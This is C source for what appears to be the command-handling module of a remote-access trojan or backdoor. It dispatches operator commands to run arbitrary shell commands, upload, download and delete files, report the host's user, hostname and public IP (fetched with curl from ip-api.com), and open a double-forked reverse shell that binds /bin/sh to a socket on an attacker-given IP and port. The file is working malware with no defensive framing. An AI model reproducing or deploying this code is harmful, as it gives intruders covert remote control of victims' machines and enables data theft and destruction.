#include "../include/cmd.h"
#include "../include/util.h"
#include <pwd.h>
#include <grp.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include "zlib.h"
#include <stdlib.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static int s_errno = 0;

typedef int (*CMD_HANDLE)(const void * in, int len, char * out, int maxSize);

static int process_getuid(const void * in, int len, char * out, int maxSize);
static int process_upload(const void * in, int len, char * out, int maxSize);
static int process_download(const void * in, int len, char * out, int maxSize);
static int process_shellcmd(const void * in, int len, char * out, int maxSize);
static int process_move(const void * in, int len, char * out, int maxSize);
static int process_mkdir(const void * in, int len, char * out, int maxSize);
static int process_del_dir(const void * in, int len, char * out, int maxSize);
static int process_rename(const void * in, int len, char * out, int maxSize);
static int process_list(const void * in, int len, char * out, int maxSize);
static int process_del_file(const void * in, int len, char * out, int maxSize);
static int process_chdir(const void * in, int len, char * out, int maxSize);
static int process_getcwd(const void * in, int len, char * out, int maxSize);
static int process_getouterip(const void * in, int len, char * out, int maxSize);
static int process_reverseshell(const void *in, int len, char * out, int maxSize);

static CMD_HANDLE g_cmdTable[256] = {
    0,
    process_getuid, //SERVER_CMD_GETUID
    process_upload, //SERVER_CMD_UPLOAD
    process_download,//SERVER_CMD_DOWNLOAD
    process_shellcmd,//SERVER_CMD_SHELL
    process_move,//SERVER_CMD_MOVE
    process_mkdir,//SERVER_CMD_MKDIR
    process_del_dir,//SERVER_CMD_DELDIR
    process_rename,//SERVER_CMD_RENAME
    process_list,//SERVER_CMD_LIST
    process_del_file,//SERVER_CMD_DELFILE
    process_chdir, //SERVER_CMD_CHDIR
    process_getcwd,//SERVER_CMD_GETCWD
    process_getouterip,//SERVER_CMD_GETOUTERIP
    process_reverseshell,
};

#define GET_CMD_HANDLE(code) g_cmdTable[code]

int handleCmd(const struct CmdReq * cmd, char * out, int maxSize)
{
    CMD_HANDLE handle = GET_CMD_HANDLE(cmd->code);
    if (handle)
    {
        unsigned short datalen = ntohs(cmd->datalen);
        struct CmdRsp * rsp = (struct CmdRsp *)out;
        rsp->flag = 0;
        rsp->sid = cmd->sid;
        int payloadLen = handle(cmd->data, datalen, rsp->data, maxSize - sizeof(*rsp));
        if (payloadLen > 0 && s_errno == 0)
        {
            if (handle == process_list || handle == process_download)//对数据进行压缩
            {
                char * plain = (char *)malloc(payloadLen);
                memcpy_s(plain, payloadLen, rsp->data, payloadLen);

                unsigned long compressedLen = maxSize - sizeof(*rsp);
                int ret = compress2((Bytef *)rsp->data, &compressedLen, (const Bytef *)plain, payloadLen, 9);
                if(ret == Z_OK)
                {
                    debug("orignal %d, after compress %ld\n", payloadLen, compressedLen);
                    rsp->flag = 1;
                    payloadLen = compressedLen;
                }
                
                free(plain);
            }
        }
        rsp->errNo = s_errno;
        rsp->datalen = htonl(payloadLen);
        return sizeof(*rsp) + payloadLen;
    }
    return 0;
}

static int process_getuid(const void * in, int len, char * out, int maxSize)
{
    //in???
    int uid = getuid();
    struct passwd * my_info = getpwuid(uid);
    struct group * grp_info = getgrgid(my_info->pw_gid);
    if(my_info == 0 || grp_info == 0)
    {
        s_errno = errno;
        return 0;
    }
    s_errno = 0;
    const char * fmt = "uid=%d(%s) gid=%d(%s)";
    return snprintf(out, maxSize, fmt, my_info->pw_uid, my_info->pw_name, my_info->pw_gid, grp_info->gr_name);
}

static int process_upload(const void * in, int len, char * out, int maxSize)
{
    const char * dstPath = (const char *)in;
    const int pathlen = strlen(dstPath) + 1;
    const char * zipData = dstPath + pathlen;
    unsigned long zipDatalen = len - pathlen;
    int result = 0;
    unsigned long fileContentlen = 10*zipDatalen;
    char * fileContent = (char *)malloc(fileContentlen);
    int ret = uncompress((Bytef *)fileContent, &fileContentlen, (const Bytef *)zipData, zipDatalen);
    if (ret == Z_OK)
    {
        ret = writeFile(dstPath, fileContent, fileContentlen);
        if (ret <= 0)
        {
            s_errno = errno;
            goto end;
        }
        s_errno = 0;
        result = snprintf(out, maxSize, "Success");
    }
    else
    {
        s_errno = CUSTOM_ERRNO;
        result = snprintf(out, maxSize, "Uncompress fail %d", ret);
    }
end:
    free(fileContent);
    return result;
}

static int process_download(const void * in, int len, char * out, int maxSize)
{
    const char * remoteFile = (const char *)in;
    int ret = readFile(remoteFile, out, maxSize);
    if (ret < 0)
    {
        s_errno = errno;
        return 0;
    }
    else if (ret == 0)
    {
        s_errno = CUSTOM_ERRNO;
        const char errMsg[] = "File size exceed 1M";
        int len = sizeof(errMsg);
        memcpy_s(out, maxSize, errMsg, len);
        return len;
    }
    s_errno = 0;
    return ret;
}
static int process_shellcmd(const void * in, int len, char * out, int maxSize)
{
    FILE * fp = popen((const char *)in, "r");
    if (fp)
    {
        int id = 0;
        do
        {
            out[id++] = fgetc(fp);
        } while (!feof(fp) && id < maxSize);
        fclose(fp);
        out[id-1]=0;
        s_errno = 0;
        return id;
    }
    
    s_errno = CUSTOM_ERRNO;
    #define FAILURE_LEN 8
    memcpy_s(out, maxSize, "Failure", FAILURE_LEN);
    return FAILURE_LEN;
}
static int process_move(const void * in, int len, char * out, int maxSize)
{
    const char msg[] = "Not implement";
    s_errno = 0;
    memcpy_s(out, maxSize, msg, sizeof(msg));
    return sizeof(msg);
}
static int process_mkdir(const void * in, int len, char * out, int maxSize)
{
    const char * dir = (const char *)in;
    if (mkdir(dir, S_IRUSR | S_IWUSR | S_IXUSR) == 0)
    {
        s_errno = 0;
        #define SUCCESS_LEN 8
        memcpy_s(out, maxSize, "Success", SUCCESS_LEN);
        return SUCCESS_LEN;
    }
    s_errno = errno;
    return 0;
}
static int process_del_dir(const void * in, int len, char * out, int maxSize)
{
    const char * dir = (const char *)in;
    if (rmdir(dir) == 0)
    {
        s_errno = 0;
        #define SUCCESS_LEN 8
        memcpy_s(out, maxSize, "Success", SUCCESS_LEN);
        return SUCCESS_LEN;
    }
    s_errno = errno;
    return 0;
}
static int process_rename(const void * in, int len, char * out, int maxSize)
{
    const char * oldname = (const char *)in;
    const char * newname = (const char *)in + strlen(oldname) + 1;
    if (rename(oldname, newname) == 0)
    {
        s_errno = 0;
        #define SUCCESS_LEN 8
        memcpy_s(out, maxSize, "Success", SUCCESS_LEN);
        return SUCCESS_LEN;
    }
    s_errno = errno;
    return 0;
}
static int process_list(const void * in, int len, char * out, int maxSize)
{
    FILE * fp = popen("ls -lrt", "r");
    if (fp)
    {
        int id = 0;
        do
        {
            out[id++] = fgetc(fp);
        } while (!feof(fp) && id < maxSize);
        fclose(fp);
        s_errno = 0;
        return id;
    }
    
    s_errno = CUSTOM_ERRNO;
    #define FAILURE_LEN 8
    memcpy_s(out, maxSize, "Failure", FAILURE_LEN);
    return FAILURE_LEN;
}
static int process_del_file(const void * in, int len, char * out, int maxSize)
{
    const char * filePath = (const char *)in;
    if (unlink(filePath) == 0)
    {
        s_errno = 0;
        #define SUCCESS_LEN 8
        memcpy_s(out, maxSize, "Success", SUCCESS_LEN);
        return SUCCESS_LEN;
    }
    s_errno = errno;
    return 0;
}
static int process_chdir(const void * in, int len, char * out, int maxSize)
{
    const char * dir = (const char *)in;
    if (chdir(dir) == 0)
    {
        s_errno = 0;
        #define SUCCESS_LEN 8
        memcpy_s(out, maxSize, "Success", SUCCESS_LEN);
        return SUCCESS_LEN;
    }
    s_errno = errno;
    return 0;
}
static int process_getcwd(const void * in, int len, char * out, int maxSize)
{
    //in not in use
    char * ret = getcwd(out, maxSize);
    if (ret == 0)
    {
        s_errno = errno;
        return 0;
    }
    s_errno = 0;
    return strlen(ret);
}

static unsigned int get_outer_ip()
{
    const char cmd[] = "curl http://ip-api.com/json/";
    FILE * fp = popen(cmd, "r");
    if (fp)
    {
        do
        {
            char buffer[1024] = {0};
            fgets(buffer, sizeof(buffer), fp);
            const char * label = "\"query\":\"";
            char * p = strstr(buffer, label);
            if (p == NULL)
                continue;
            
            p += strlen(label);
            for (int i = 0; p[i]; ++i)
            {
                if (p[i] == '"')
                {
                    p[i] = 0;
                    break;
                }
            }
            
            struct in_addr addr;
            if(inet_aton(p, &addr) == 0)
                continue;

            unsigned int ip = htonl(addr.s_addr);
            unsigned char first = (ip & 0xff000000)>>24;
            if (first != 10 && first != 192 && first != 172 && first != 100 && first != 127)
            {
                return ip;
            }
        }while(!feof(fp));
        fclose(fp);
    }
    return 0;
}

int process_getouterip(const void * in, int len, char * out, int maxSize)
{
    unsigned int * ip = (unsigned int *)out;
    char * hostname = (char *)(ip + 1);
    *ip = get_outer_ip();
    if(gethostname(hostname, maxSize - sizeof(*ip)) == 0)
    {
        s_errno = 0;
        return sizeof(*ip) + strlen(hostname);
    }
    s_errno = errno;
    return 0;
}

int process_reverseshell(const void *in, int len, char * out, int maxSize)
{
    if (fork() != 0)
    {
        return 0;
    }

    if (fork() != 0)
    {
        exit(0);
    }

    const char * ip = in;
    short port = atoi(in + strlen(ip) + 1);

    int sockfd = 0;
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(port);
    srv_addr.sin_addr.s_addr = inet_addr(ip);

    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);

    if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) != 0)
    {
        close(sockfd);
        exit(0);
    }
    
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);
    char *const params[] = {"/bin/sh", NULL};
    char *const environ[] = {NULL};
    execve("/bin/sh", params, environ);
    return 0;
}
